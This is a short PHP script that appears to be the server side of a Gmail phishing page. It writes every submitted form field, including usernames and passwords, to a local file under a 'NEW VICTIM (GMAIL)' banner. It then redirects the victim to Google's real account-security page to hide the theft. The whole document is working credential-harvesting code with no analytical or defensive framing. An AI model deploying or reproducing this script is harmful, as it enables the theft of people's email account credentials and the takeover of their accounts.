<?php
// Capture Gmail Data
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM (GMAIL) ----------\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect to Google Security Page
header("Location: https://myaccount.google.com/security");
exit;
?>
